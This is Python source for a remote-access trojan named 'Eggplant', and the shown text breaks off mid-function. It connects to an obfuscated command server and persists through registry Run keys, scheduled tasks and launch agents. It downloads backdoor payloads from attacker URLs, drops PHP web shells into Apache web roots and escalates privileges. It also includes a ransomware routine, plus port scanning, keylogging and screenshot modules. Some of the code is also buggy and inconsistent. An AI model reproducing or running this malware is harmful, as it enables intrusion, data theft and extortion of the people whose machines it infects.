import os
import sys
import socket
import subprocess
from time import sleep
from uuid import uuid1
from imp import new_module
from requests import get, post
from base64 import b64encode, b64decode
from eggplant import Eggplant
try:
    if os.name is 'nt':
        from _winreg import HKEY_CURRENT_USER, KEY_WRITE, KEY_ALL_ACCESS, REG_SZ, CloseKey, DeleteValue, OpenKey, SetValueEx
        from ctypes import windll
        from win32com.shell.shell import ShellExecuteEx
except: pass

try:
    from Crypto.Cipher import AES
    from Crypto.Hash import HMAC, SHA256
except: pass

class Eggplant(object):
    """
    Mother of all Eggplants. Capable of birthing entire generations of eggplants
    """
    def __init__(self, *args, **kwargs):
        self.exit_status    = bool(0)
        self.debug          = bool(kwargs.get('debug'))
        self.listen_port    = int(kwargs.get('listen_port')) if kwargs.get('listener_port') else int(1338)
        self.connect_port   = int(kwargs.get('connect_port')) if kwargs.get('connect_port') else int(1337)
        self.backdoor_port  = int(kwargs.get('backdoor_port')) if kwargs.get('backdoor_port') else int(4433) 
        self.files          = dict(kwargs.get('files')) if kwargs.get('files') else dict({'cache':[]})
        self.persistence    = dict(kwargs.get('persistence')) if kwargs.get('persistence') else dict({'scheduled tasks':[], 'hidden files':[], 'registry keys':[]}) if os.name is 'nt' else dict({'launch agents':[], 'hidden files':[]})
        self.urls           = dict(kwargs.get('urls')) if kwargs.get('urls') else dict({'windows_payload': 'https://snapchat.sex/svshost.exe', 'linux_payload': 'http://elderlyeggplant.000webhostapp.com/linux_payload.txt', 'screenshot': 'https://raw.githubusercontent.com/colental/AngryEggplant/master/modules/screenshot.py', 'make_osx_app': 'http://elderlyeggplant.000webhostapp.com/make_osx_app.py', 'osx_backdoor': 'http://elderlyeggplant.000webhostapp.com/osx_payload.sh', 'icon_icns': 'http://elderlyeggplant.000webhostapp.com/icon.icns', 'keylogger': 'https://raw.githubusercontent.com/colental/AngryEggplant/master/modules/keylogger.py', 'icon_png': 'http://elderlyeggplant.000webhostapp.com/icon.png', 'services': 'https://svnweb.freebsd.org/base/head/etc/services?revision=310355', 'images': 'https://api.imgur.com/3/upload', 'icon_ico': 'http://elderlyeggplant.000webhostapp.com/icon.ico', 'plist': 'http://elderlyeggplant.000webhostapp.com/Info.plist'})
        self.server         = dict(kwargs.get('server')) if kwargs.get('server') else dict({'url': 'MTI2OGE3NDQ3MDI3MDRlYTA3MTAzYjM3M2VhMjMzODMxNWJmM2FiMGMyM2Y4MDEyMjRjODBmYmVlZmY2NzFlNTQyNzc0NTgwNDZlMGE4MTkwYWIyY2EyY2ZlMzQ1ZWFlNjczMzE2OTcyN2M1YjZkZjZjYTIwNjIwZTYzYjgyNTcyNDg0YjM5ZTI3NjIxZGI3N2QyZDMyNGVjMTk4ZDYxZmYyYTMzNmU2NDU4NzBmY2I4ZTU2ZmRiNDY1YzA5MDcyMmYxYTI3NDYyMDQzNzhjMmQ1NDNmZjRjNWRkODEyYjE2ZTMyZmZiYzc3N2ZhNTYzMzY1NjdkYjcyYjk1ZGZiMWQ3ODc2NDQyMjY2Y2E3MzYwODY2ZTZiODc1MjdlZjk0ZGI4Y2IyZjY5NGQ2YTgzNDljNzIwOTlmNTY5ZWZjMDllOTkzNDMyZjRiNzZlNjc3YTkyZjAyNDgxZjM3YjMyYTY3ZmYwYzk0M2VjYWE3MjVmNTI3MGY5MWE5NDYzYjY5NTI0Y2Y3ZDBlZjViYTAwNzE3OWIyNjQyODY4NTdhYzVmZjUzZTQ3YThjMzdlZGYzYWZjNzU0NDVmOWYzNDAwNzQ1NDhjZDAyNTU1YWU0NzIwMjE0ODM5MzhlY2EzMzQ5N2VlNzBjNDRlYmI0OTM1NzM4NjMxOTVkY2Q0OTUzNTg0Nzg4ZTU5NWMxODMyZWRjZGFjNTNmOTA2OTVlYzE1MjA2MzMzMDc2YjEzMzQzOTMwNDIzNjY1MTIwNjMxNTg3NzdjNDdiMjZhM2UzZDRjNzUxOWNhYjEzMDFkYjljYzM3YzQ1OTcxZjM=', 'api': 'ODY0MTY1YTBlMTg0MzlhYmIyN2Q4NGE0YjM3MWNiZDZlYmFmNDUzOTE3Mjk3NTA=', 'key': 'ODE0OTc0YzRkNDI1ZTVlYTA0YTM1YzkzMDY5OTE2NDRiMWYwODk2OTYzYzZmYTg1ODEyNGMxMGRiMDc0MzU2NjE2MDQ4NjI3ZTRhNWMzZGRkNTI1Y2ZlNTYzNmEyZDAzMTU3NzcwMDVhMmQ3NTRlNTZhOTkyMGRkOWZjOWIyMDQ3ZGRkMGIwMGM0ZWU5NWVlOGM0ODY0ZDk3ZWIwODQ2ODA4MDQ3ZmQzZTAzMzE2ZDJmMzU1NTRjMjMyY2EyNTQ1NDNmOTYzZDc1ZTBhZDA2ZGU4MTMzNzY2MTdlNzZhNzQwYmE1ZDEwMDA1YmQ5YmQ2YTMwYWEwZWJiNWM3MTI0NjI0NWJlZTI5N2ZlNGMzODJjYWU5ZjQxYmJmMjVjNmRiMWNhY2IyYmVhNTJhNmY4YWI3MzQxZDcyMjUyOTM2ZTg5M2UyNmE5NzQ1OTQ4YmYzMzk1YTg2YTRlMTczMTM3ODk1OGY0ODkxMWUxYzc0OQ=='})
        self.open_ports     = dict(kwargs.get('port_scans')) if kwargs.get('port_scans') else dict({})
        self.backdoors      = dict(kwargs.get('backdoors')) if kwargs.get('backdoors') else dict({})
        self.local_network  = dict(kwargs.get('local_network')) if kwargs.get('local_network') else dict({})
        self.services       = dict({i.split()[1].split('/')[0]:[i.split()[0], ' '.join(i.split()[2:])] for i in get(self.urls.get('services')).text.encode().splitlines() if len(i.split())>1 if 'tcp' in i.split()[1]})
        self.sessions       = bytes(kwargs.get('sessions')) if kwargs.get('sessions') else self._sessions()
        self.fname          = bytes(sys.argv[0][:sys.argv[0].rfind('.')])
        self.ip             = bytes(get('http://api.ipify.org').text.encode())
        self.localhost      = bytes(socket.gethostbyname(socket.gethostname()))
        self.login          = bytes(os.getenv('USERNAME')) if bool(os.getenv('USERNAME')) else bytes(os.getenv('USER'))
        self.machine        = bytes(os.getenv('COMPUTERNAME')) if bool(os.getenv('COMPUTERNAME')) else bytes(os.getenv('NAME'))
        self.platform       = bytes(sys.platform) if 'darwin' not in sys.platform else 'Mac OS X'
        self.mac            = bytes('-'.join(uuid1().hex[20:][i:i+2] for i in range(0,11,2)).upper())
        self.pstring        = bytes('ping -n 1 -w 90 {}') if os.name is 'nt' else bytes('ping -c 1 -w 90 {}')
        self.device         = bytes(os.popen('uname -a').read()) if os.name != 'nt' else subprocess.check_output('VER', shell=True)
        self.socket         = self._connect()
        self.dhkey          = self._diffiehellman()
        self.commands       = {
            'cat'           :   self.cat,
            'cd'            :   self.cd,
            'ls'            :   self.ls,
            'lan'           :   self.lan,
            'pwd'           :   self.pwd,
            'info'          :   self.info,
            'wget'          :   self.wget,
            'kill'          :   self.kill,
            'unzip'         :   self.unzip,
            'update'        :   self.update,
            'tempfile'      :   self.tempfile,
            'selfdestruct'  :   self.destruct,
            'mac'           :   self.mac_address,
            'encrypt'       :   self.encrypt_file,
            'decrypt'       :   self.decrypt_file,
            'register'      :   self.register_client
        }
        self.modules        = {
            'ransom'        :   self.ransom,
            'portscan'	    :   self.portscan,
            'backdoor'      :   self.backdoor,
            'admin'         :   self.is_admin,
            'escalate'      :   self.escalate,
            'keylogger'     :   self.keylogger,
            'screenshot'    :   self.screenshot,
            'persistence'   :   self.run_persistence
        }
            
    def _long_to_bytes(i):
        # helper function
        return bytes(bytearray.fromhex(hex(l).strip('0x').strip('L')))

    def _bytes_to_long(i):
        # helper function
        return long(bytes(i).encode('hex'), 16)

    def _random_char(self, number=1):
        # worker function
        return str().join([self._choice([chr(i) for i in range(48, 123) if not 58 < i < 65 if not 90 < i < 97]) for _ in range(number)])
    
    def _pad(self, data):
        # worker function
        return bytes(data + b'\0' * (AES.block_size - len(data) % AES.block_size))

    def _choice(self, items):
        # worker function
        return items[int([n for n in [ord(os.urandom(1)) for i in xrange(1000)] if n < len(items)][0])]

    def _random_var(self):
        # worker function
        return str().join(self._choice([chr(i) for i in range(65, 123) if not 90 < i < 97]) for x in range(3)) + "_" + str().join([self._choice([chr(i) for i in range(48,58)]) for x in range(3)])

    def _tempdir(self):
        # worker function
        for tmp in ['TEMP','TMP','TEMPDIR','TMPDIR']:
            tmpdir = os.getenv(tmp)
            if tmpdir:
                return tmpdir
        if os.name is 'nt':
            for tmp in ["%TEMP%", "%TEMPDIR%", "%TMP%"]:
                tmpdir = os.path.expandvars(tmp)
                if tmpdir != tmp:
                    return tmpdir
        else:
            for tmp in ["/tmp", "/var/tmp"]:
                if os.path.isdir(tmp):
                    return tmp
        return os.getcwd()


    def _sessions(self):
        # worker function
        self.files.update({'session':os.environ.get('TEMP', failobj=os.getcwd()) + os.sep + '.' + self.mac + '.txt'})
        if os.path.isfile(self.files.get('session')):
            with open(self.files.get('session'), 'r') as fs:
                prev = int(fs.read())
            current = prev + 1
        else:
            current = 1

        with file(self.files.get('session'), 'w') as fp:
            fp.write(str(current))

        return str(current)

    def _send(self, data, method='default'):
        # worker function
        block = data[:4096]
        data  = data[len(block):]
        ciphertext  = self._encrypt(block)
        msg = '{}:{}\n'.format(method, ciphertext)
        self.socket.sendall(msg)
        if len(data):
            return self._send(data, method)

    def _receive(self):
        # worker function
        cmd_buffer  = ""
        cmd_len     = 1
        while cmd_len:
            cmd_data    = self.socket.recv(1024)
            cmd_len     = len(cmd_data)
            cmd_buffer += cmd_data
            if cmd_len < 1024:
                break
        if len(cmd_buffer):
            data = self._decrypt(cmd_buffer)
        else:
            data = None
        return data.rstrip()

    def _connect(self):
        # worker function
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setblocking(True)
        try:
            info = get(self._deobfuscate(self.server.get('url')), headers={self._deobfuscate(self.server.get('api')) : self._deobfuscate(self.server.get('key'))}).json()
            addr = (info.get(info.keys()[0])[0].get('ip').encode(), self.connect_port)
            s.connect(addr)
            self.socket = s
            return s
        except Exception as e:
            if self.debug:
                print "Connection error: {}".format(str(e))
            sleep(10)
            execfile(sys.argv[0])
            sys.exit(0)

    def _diffiehellman(self, bits=2048):
        # worker function
        try:
            p = 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA18217C32905E462E36CE3BE39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9DE2BCBF6955817183995497CEA956AE515D2261898FA051015728E5A8AACAA68FFFFFFFFFFFFFFFF
            g = 2
            a = bytes_to_long(os.urandom(32)) 
            xA = pow(g, a, p)
            self.socket.send(long_to_bytes(xA))
            xB = bytes_to_long(self.socket.recv(256))
            x = pow(xB, a, p)
            return SHA256.new(long_to_bytes(x)).digest()
        except Exception as e:
            if self.debug:
                print "Diffie-Hellman error: {}".format(str(e))
            sleep(10)
            execfile(sys.argv[0])
            sys.exit(0)

    def _encrypt(self, plaintext):
        # worker function
        try:
            text = self._pad(bytes(plaintext))
            iv = os.urandom(AES.block_size)
            cipher = AES.new(self.dhkey[:16], AES.MODE_CBC, iv)
            ciphertext = iv + cipher.encrypt(text)
            hmac_sha256 = HMAC.new(self.dhkey[16:], msg=ciphertext, digestmod=SHA256).digest()
            output = b64encode(ciphertext + hmac_sha256)
            if self.debug:
                print output
            return output
        except Exception as e:
            if self.debug:
                print "Encryption error: {}".format(str(e))

    def _decrypt(self, ciphertext):
        # worker function
        try:
            ciphertext  = b64decode(ciphertext)
            iv          = ciphertext[:AES.block_size]
            cipher      = AES.new(self.dhkey[:16], AES.MODE_CBC, iv)
            check_hmac  = ciphertext[-SHA256.digest_size:]
            calc_hmac   = HMAC.new(self.dhkey[16:], msg=ciphertext[:-SHA256.digest_size], digestmod=SHA256).digest()
            output      = cipher.decrypt(ciphertext[len(iv):-SHA256.digest_size])
            if self.debug:
                print output.rstrip(b'\0')
                if check_hmac != calc_hmac:
                    print str("Warning: data integrity may be compromised: the sent HMAC-SHA256 Hash did not match the calculated hash.")
            return output.rstrip(b'\0')
        except Exception as e:
            if self.debug:
                print "Decryption error: {}".format(str(e))
  
    def _deobfuscate(self, block):
        # worker function
        p = []
        block = b64decode(block)
        for i in xrange(2, len(block)):
            is_mul = False
            for j in p:
                if i % j == 0:
                    is_mul = True
                    break
            if not is_mul:
                p.append(i)
        return str().join(block[n] for n in p)

    def _persistence(self, **kwargs):
        # worker function
        if os.name is 'nt':
            key_name = os.path.splitext(os.path.basename(sys.argv[0]))[0]
            key_value = sys.argv[0]
            interval = 'hourly'
            try:
                run_key     = r'Software\Microsoft\Windows\CurrentVersion\Run'
                key_name    = os.path.splitext(os.path.basename(sys.argv[0]))[0]
                reg_key     = OpenKey(HKEY_CURRENT_USER, run_key, 0, KEY_WRITE)
                SetValueEx(reg_key, key_name, 0, REG_SZ, key_value)
                CloseKey(reg_key)
                self.persistence.get('registry keys').append((run_key, key_name))
            except: pass
            try:
                direct = os.popen('attrib +h {}'.format(sys.argv[0])).read()
                self.persistence.get('hidden files').append(sys.argv[0])
            except: pass
            try:
                schtask = os.popen('schtasks /create /tn {} /tr {} /sc {} /f'.format(key_name, key_value, interval)).read()
                self.persistence.get('scheduled tasks').append(schtask)
            except: pass

        elif sys.platform in ('darwin','ios'):
            try:
                filename = os.path.basename(sys.argv[0])
                if not filename.startswith('.'):
                    hidden = '.' + filename
                    os.rename(sys.argv[0], hidden)
                    self.persistence.get('hidden files').append(hidden)
            except:
                pass

            try:
                osx_paths = ['var','tmp','lib','local','cache']
                osx_files = ['.local','.cache','.fsevents','.V100_Spotlight','.bash_profile']
                fpath = os.path.join(self._choice(osx_paths), self._choice(osx_files))
                os.makedirs(fpath) if not os.path.isdir(fpath) else None
            except:
                fpath = os.path.join(os.environ.get('TEMP', failobj=os.getcwd()), self._choice(osx_files))
            try:
                plist       = get(self.urls.get('plist')).text.encode()
                label       = self._choice('updates','cache','itunes','spotlight','archives')
                infoPlist   = plist.replace('__LABEL__',label).replace('__SELF__', sys.argv[0])

                with file(fpath, 'w') as fp:
                    fp.write(infoPlist)

                self.persistence.get('hidden files').append(fpath)
                os.chmod(fpath, 0755)
                self.persistence.get('launch agents').append('~/Library/LaunchAgents/'+ label + '.plist')
                os.startfile(fpath)
            except:
                pass
        return True

    def _install_update(self, name, executable, version):
        # worker function
        try:
            updatePath  = os.environ.get('TEMP', failobj=os.getcwd())
            updateName  = os.path.join(updatePath, executable)
            updateUrl   = 'http://{}/{}'.format(socket.getpeername()[0], os.path.basename(sys.argv[0]))
            getUpdate   = self.wget(updateUrl)
        except Exception as ue:
            return "Update download from '{}' failed with error: {}".format(url, str(ue))

        if os.name is 'nt':
            try:
                p = subprocess.Popen('@ECHO OFF',0,None,subprocess.PIPE,subprocess.PIPE,subprocess.PIPE,shell=True)
                p.communicate('start /b /d ' + updatePath + ' ' + executable)
            except Exception as f:
                if self.debug:
                    return "Update failed with error: {}".format(str(f))

        elif sys.platform.starswith('darwin'):
            try:
                bundle          = name.replace(' ','')
                bundleVersion   = bundle + " " + version
                bundleIdentify  = "com.apple." + bundle
                appPath         = os.getcwd() + os.sep + bundle + '.app'
                os.makedirs(appPath + os.sep + 'Contents' + os.sep + 'MacOS')
                os.mkdir(appPath + os.sep + 'Contents' + os.sep + 'Resources')
                icon            = self.wget(self.urls.get('icon_icns'), path=str(appPath + os.sep + 'Contents' + os.sep + 'Resources' + os.sep + 'icon.icns'))
                infoPlist       = get(self.urls.get('plist')).text.encode() % (exe, bundleVersion, icon, bundleIdentify, bundle, bundleVersion, version)

                with file(str(appPath + os.sep + 'Contents' + os.sep + "PkgInfo"), "w") as fp:
                    fp.write("APPL????")

                with file(appPath + os.sep + 'Contents' + os.sep + 'Info.plist', "w") as fw:
                    fw.write(infoPlist)

                os.chmod(appPath + os.sep + 'Contents' + os.sep + 'MacOS' + os.sep + exe, 0755)

            except Exception as e:
                if self.debug:
                    print "Update error: {}".format(str(e))

    def _ransom_update(self, filename):
        # worker function
        try:
            stmt = "INSERT INTO filesystems (ip, mac, filename, keyvalue) VALUES ('{}','{}','{}','{}')".format(self.ip, self.mac, os.path.abspath(filename), self.dhkey)
            self._send(stmt, method='query')
        except Exception as e:
            return "Ransom database update error: {}".format(str(e))

    def _ransom(self, arg, dirname, fnames):
        # worker function
        errors = [e for e in map(self._ransom_update, [x for x in map(self.encrypt_file, [os.path.join(dirname, i) for i in fnames]) if x]) if e]
        if errors:
            if self.debug:
                print "Warning: ransom worker returned the following error(s):\n{}".format("\n".join(errors))

    def _purge_regkeys(key_name):
        # cleaner function
        all_keys = self.persistence.get('registry keys').keys()
        for key in all_keys:
            run_key = key[0]
            value   = key[1]
            try:
                reg_key = OpenKey(HKEY_CURRENT_USER, run_key, 0, KEY_ALL_ACCESS)
                DeleteValue(reg_key, value)
                CloseKey(reg_key)
            except Exception as e:
                if self.debug:
                    print "Destruct error: {}".format(str(e))

    def _unschedule_tasks(self):
        # cleaner function
        all_tasks = self.persistence.get('scheduled tasks')
        for schtask in all_tasks:
            task = schtask.split('"')[1]
            try:
                delete = subprocess.Popen(['schtasks','/delete','/tn',task,'/f'],0,None,subprocess.PIPE,subprocess.PIPE,subprocess.PIPE,shell=True)
                output,error = delete.communicate()
                if 'SUCCESS' not in output:
                    if self.debug:
                        print "Delete scheduled task failed to remove task with name: {}".format(task[0])
            except Exception as e:
                if self.debug:
                    print "Destruct error: {}".format(str(e))

    def _remove_backdoors(self):
        # cleaner function
        for bd in self.backdoors: 
            if os.path.isfile(bd):
                try:
                    os.remove(bd)
                except Exception as t:
                    if self.debug:
                        print "Remove backdoor returned error: {}".format(str(t))

            elif os.path.isdir(bd):
                if not os.name=='nt':
                    try:
                        r = subprocess.check_output(['rm','-rf',bd],shell=True)
                    except Exception as er:
                        if self.debug:
                            print "Remove backdoor returned error: {}".format(str(er))
                else:
                    try:
                        r = subprocess.Popen(['rmdir','/s','/q',bd],0,None,subprocess.PIPE,subprocess.PIPE,subprocess.PIPE,shell=True)
                    except Exception as p:
                        if self.debug:
                            print "Remove backdoor returned error: {}".format(str(p))
        
    def _backdoor_darwin(self):
        # worker function
        try:
            if 'make_osx_app' not in globals():
                osx_app_file = get(self.urls.get('make_osx_app')).content       
                make_osx_app = create_module(osx_app, 'make_osx_app')
            appname      = os.path.splitext(os.path.basename(sys.argv[0]))[0]
            iconfile     = self.wget(self.urls.get('icon_icns'), path=icon_path)
            payload_file = self.wget(self.urls.get('osx_backdoor'))
            
            with file(payload_file, 'r') as fr:
                payload = fr.read()

            osx_payload  = payload.replace('__HOST__', self.ip).replace('__PORT__', self.backdoor_port).replace('__APPNAME__',appname)
            
            try:
                app_bundle = globals()['make_osx_app'].main(osx_payload, icon=iconfile, version='27.0.0.170')
            except Exception as u:
                if self.debug:
                    print "Mac OS X make app bundle error: {}".format(str(u))
                    
            os.chmod(payload_path, 0755)
            
            if not self.backdoors.has_key('launch agent'):
                self.backdoors.update({'launch agent': []})
                
            self.backdoors.update({'app':str(os.getcwd() + os.sep + appname + '.app'), 'launch agent':str('~/Library/LaunchAgents/com.apple.'+appname)})
            return '\nBackdoor app:\t{}\nLaunch agent:\t{}\n'.format(str(os.getcwd() + os.sep + appname + '.app'), str('~Library/LaunchAgents/com.apple.' + appname))
        except Exception as y:
            if self.debug:
                return "Mac OS X backdoor error: {}".format(str(y))

    def _backdoor_windows(self):
        # worker function
        try:
            if not self.backdoors.has_key('pupy'):
                self.backdoors.update({'pupy': []})
            tn = 'MicrosoftUpdateManager'
            bd = self.wget(self.urls.get('windows_payload'), path=tn)
            if 'Error' not in bd:
                self.backdoors.get('pupy').append(bd)
                _ = os.popen('attrib +h {}'.format(os.path.abspath(bd))).read()
                __  = os.popen(bd).read()
                ___ = os.popen('schtasks /create /tn {} /tr {} /sc hourly'.format(tn, bd)).read()
                self.persistence.get('hidden files').append(bd)
                self.persistence.get('scheduled tasks').append(tn)
                return 'Success - backdoor listening on {} at port {}'.format(str(self.ip), str(self.backdoor_port))
            else:
                return 'Failed to download backdoor'
        except Exception as ee:
            if self.debug:
                return 'Windows backdoor failed with error: {}'.format(str(ee))

    def _backdoor_linux(self):
        # worker function
        try:
            result = []
            if not self.backdoors.has_key('apache'):
                self.backdoors.update({'apache':[]})
            if subprocess.call('service --status-all | grep apache2',0,None,None,subprocess.PIPE,subprocess.PIPE,shell=True) == 0 and os.path.isdir('/var/www/html'):
                php = self.wget(self.urls.get('linux_payload'), path='/var/www/html/.apache.php')
                self.backdoors.get('apache').append(path)
                result.append("Embedded backdoor in the Apache web server root directory: '" + path + "'")
                items = [i for i in os.listdir('/var/www/html') if os.path.isdir(i)]
                for doc in items: 
                    np = os.path.join(os.path.abspath(doc), '.apache.php')
                    payload = self.wget(self.urls.get('linux_payload', path=np))
                    result.append("Embedded backdoor in a website document root as: " + np)
                    self.backdoors.append(np)
                if subprocess.call('service apache2 start',0,None,None,subprocess.PIPE,subprocess.PIPE,shell=True) == 0:
                    result.append("Apache webserver now running on client host machine...")
                return "\n".join(result)
        except Exception as bderr:
            if self.debug:
                return "\n{} backdoor failed with error: {}".format(str(os.environ.get('OS')).capitalize(), str(bderr))
      
    def cat(self, file_path):
        """
        Emulates the UNIX command for Windows compatability with Windows
        """
        if os.path.isfile(file_path):
            try:
                with open(file_path) as f:
                    return f.read(4000)
            except IOError:
                return 'Error: Permission denied.'
        else:
            return 'Error: File not found.'
        
    def ls(self, path='.'):
        """
        Emulates the UNIX command for Windows compatability with Windows
        """
        if os.path.exists(path):
            try:
                return '\n'.join(os.listdir(path))
            except OSError:
                return 'Error: Permission denied.'
        else:
            return 'Error: Path not found.'

    def pwd(self):
        """
        Emulates the UNIX command for Windows compatability with Windows
        """
        return os.getcwd()

    def cd(self, path='.'):
        """
        Emulates the UNIX command for Windows compatability with Windows
        """
        return os.chdir(path)

    def unzip(self, action):
        """
        Unzip compressed file
        """
        global create_module
        try:
            if 'unzip' in globals():
                result = globals()['unzip'](action)
                return result
            else:
                unzip = create_module(get(self.urls['unzip']).text.encode(), 'unzip')
                result = unzip(action)
                return result
        except Exception as e:
            return "Unzip returned error: {}".format(str(e))

    def wget(self, url, base=None):
        """
        Emulates the UNIX command for Windows compatability with Windows
        """
        if not url.startswith('http'):
            return 'Error: URL must begin with http:// or https:// '
        try:
            name = self.tempfile(base, ext=os.path.splitext(url)[1]) if base else self.tempfile(ext=os.path.splitext(url)[1])
            with file(name, 'wb') as fp:
                fp.write(get(url).content)
            return name
        except Exception as e:
            if self.debug:
                print "Wget download for URL '{}' failed with error: {}".format(url, str(e))

    def register_client(self):
        """
        Register client host machine on server database
        """
        return self.register()

    def mac_address(self):
        """
        Use the hardware id (MAC address) to uniquely identify the host machine
        """
        return self.mac

    def kill(self):
        """
        End client connection
        """
        try:
            _ = sock.close()
        except:
            pass
        exit()

    def identity(self):
        """
        Display basic information about client host machine and network
        """
        return "\n\tHost Machine Information\n" + "\n".join(["{} : {}".format(i[0],i[1]) for i in [('Sessions',self.sessions()), ('Platform',self.platform), ('IP',self.ip), ('Machine',self.machine), ('Login',self.login), ('Admin',self.admin), ('Files',self.files)] if i[1]])

    def register(self):
        """
        Register the client host machine with the server
        """
        return "INSERT INTO clients (uid, sessions, ip, platform, device, machine, login, admin, fpath, hidden files, scheduled tasks, registry keys) VALUES ('{}', '{}', '{}', '{}', '{}', '{}', '{}', '{}','{}')".format(self.mac, self.sessions(), self.ip, self.platform, self.device, self.machine, self.login, self.admin, self.files)
 
    def is_admin(self):
        """
        Determine if current user logged into the client host machine has administrator privileges
        """
        return bool(windll.shell32.IsUserAnAdmin() == 0) if os.name is 'nt' else bool(os.getuid() == 0)

    def tempfile(self, base=None, ext=None):
        """
        Generate a custom or generic temporary filename in the correct directory
        """
        if base and ext:
            output = os.path.join(self._tempdir(), base + '_' + self._random_char(3) + ext)
        elif base and not ext:
            output = os.path.join(self._tempdir(), base + '_' + self._random_char(3))
        elif not base and ext:
            os.path.join(self._tempdir(), self._random_var() + ext)
        else:
            os.path.join(self._tempdir(), self._random_var())
        
    def ping(self, host):
        """Pings the given host, returns the host IP if host is alive"""
        if subprocess.call(self.pstring.format(host), shell=True) == 0:
            return host

    def portscan(self, ip):
        """
        Scan the given host and returns open ports
        """
        try:
            socket.inet_aton(ip)
        except socket.error:
            return 'Error: Invalid IP address.'

        result = []
        for p in [21, 22, 23, 25, 53,
                  80, 110, 111, 135, 139,
                  143, 179, 443, 445, 514,
                  993, 995, 1723, 3306, 3389,
                  5900, 8000, 8080, 8443, 8888]:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            c = s.connect_ex((ip, p))
            socket.setdefaulttimeout(0.5)
            if not c:
                result.append(p)
        if len(result):
            return result
        return

    def escalate(self):
        """
        Attempt to escalate privileges if client is not running as admin
        """
        if self.is_admin():
            return True
        else:
            try:
                ShellExecuteEx(lpVerb='runas', lpFile=sys.executable, lpParameters='{} asadmin'.format(sys.argv[0]))
                sys.exit(0)
            except Exception as e:
                if self.debug:
                    print "UAC error: {}".format(str(e))
                return False

    def lan(self):
        """
        Local network port scan
        """
        result = None
        subnet = filter(self.ping, ['.'.join(self.localhost.split('.')[:-1]) + '.' + str(i) for i in range(1,255)])
        if len(subnet):
            for ip in subnet:
                ports  = self.portscan(ip)
                if len(ports):
                    result = [ip, '\t{:>5}\t{:>4}\t{:<20}'.format('Port','State','Service')]
                    for p in ports:
                        state   = 'open'
                        service = ' '.join(self._services().get(str(p))).title() if not self.services else ' '.join(self.services.get(str(p))).title()
                        result.append('\t{:>5}\t{:>4}\t{:<20}'.format(p, state, service))
                    result.append('')
        if result:
            return result
        else:
            return "No live hosts detected in local area network"

    def ransom(self, path):
        """
        Encrypt the selected file or all files in the selected directory
        """
        if os.path.isfile(path):
            _ = self.encrypt_file(path)
        elif os.path.isdir(path):
            try:
                os.path.walk(path, self._ransom, None)
            except Exception as e:
                if self.debug:
                    print "Ransom error: {}".format(str(e))
                return "Ransom error: {}".format(str(e))
        return "Successfully encrypted '{}'".format(path)

    def run_persistence(self):
        """
        Establish persistence on host machine
        """
        self._persistence()
        output = []
        for k in self.persistence:
            if len(self.persistence[k]):
                output.append('')
                output.append('[{:>8}]'.format(k.title()))
                for i in self.persistence.get(k):
                    if len(i): 
                        output.append('\t{:>10}'.format(i))
        return '\n'.join(output) + '\n'

    def encrypt_file(self, filename):
        """
        Encrypt a file on client host machine
        """
        if os.path.isfile(filename):
            try:
                with file(filename, 'r') as fp:
                    data = fp.read()
                with file(filename, 'w') as fc:
                    fc.write(self._encrypt(data))
                return filename
            except Exception as e:
                if self.debug:
                    print "File encryption returned an error: {}".format(str(e))
            
    def decrypt_file(self, filename):
        """
        Decrypt a file encrypted by the client on the host machine
        """
        if os.path.isfile(filename):        
            try:
                with file(filename, 'r') as fp:
                    data = fp.read()
                with file(filename, 'w') as fc:
                    fc.write(self._decrypt(data))
                return filename
            except Exception as e:
                if self.debug:
                    print "File decryption returned an error: {}".format(str(e))
                              
    def backdoor(self):
        """
        Generates a platform-specific backdoor and drops it on the host machine 
        """
        if sys.platform in ('darwin','ios'):
            result = self._backdoor_darwin()
        elif os.name is 'nt':
            result = self._backdoor_windows()
        elif 'linux' in sys.platform or 'bsd' in sys.platform:
            result = self._backdoor_linux()
        else:
            result = "Platform '{}' is not supported for this module".format(sys.platform)
        return result

    def destruct(self):
        """
        Purges host machine of any trace of the client (hidden files, registry keys, backdoors)
        """
        try:
            for bd in self.backdoors:
                try:
                    self._remove_backdoors()
                except Exception as z:
                    if self.debug:
                        print "Backdoor-destruct error: {}".format(str(z))
                        
            for k in self.files.keys():
                for f in self.files.get(k):
                    if os.path.isfile(f):
                        try:
                            os.remove(f)
                        except Exception as e:
                            if self.debug:
                                print "File-destruct error: {}".format(str(e))

            for h in self.persistence.get('hidden files'):
                try:
                    os.remove(h)
                except Exception as c:
                    if self.debug:
                        print "Hidden file destruct error: {}".format(str(c))

            if os.name is 'nt':
                try:
                    self._purge_regkeys()
                except Exception as v:
                    if self.debug:
                        print "Registry key destruct error: {}".format(str(v))

            if os.name is 'nt':
                try:
                    self._unschedule_tasks()
                except Exception as sc:
                    if self.debug:
                        print "Schedule tasks destruct error: {}".format(str(sc))

            if sys.platform in ('darwin','ios'):
                for agent in self.persistence.get('launch agents'):
                    try:
                        os.remove(agent)
                    except Exception as xc:
                        if self.debug:
                            print "Launch agent destruct error: {}".format(str(x))

            for i in self.files.get('cache'):
                if os.path.isfile(i):
                    try:
                        os.remove(i)
                    except Exception as t:
                        if self.debug:
                            print "Cache file destruct error: {}".format(str(t))        

                elif os.path.isdir(i):
                    if not os.name is 'nt':
                        try:
                            r = subprocess.check_output(['rm','-rf',i],shell=True)
                        except Exception as er:
                            if self.debug:
                                print "Posix directory tree directory destruct error: {}".format(str(er))
                    else:
                        try:
                            r = subprocess.Popen(['rmdir','/s','/q',i],0,None,subprocess.PIPE,subprocess.PIPE,subprocess.PIPE,shell=True)
                        except Exception as p:
                            if self.debug:
                                print "Windows directory tree destruct error: {}".format(str(p))
                try:
                    self._kill()
                except Exception as p:
                    if self.debug:
                        print "Connection shutdown returned error: {}".format(str(p))
                try:
                    os.remove(sys.argv[0])
                except Exception as p:
                    if self.debug:
                        print "Self-destruct error: {}".format(str(p))
        finally:
            exit()

    def screenshot(self):
        global create_module
        """
        Takes a screenshot on host machine, uploads it to a public image board, and returns the url of the image
        """
        try:
            if 'screenshot' not in globals():
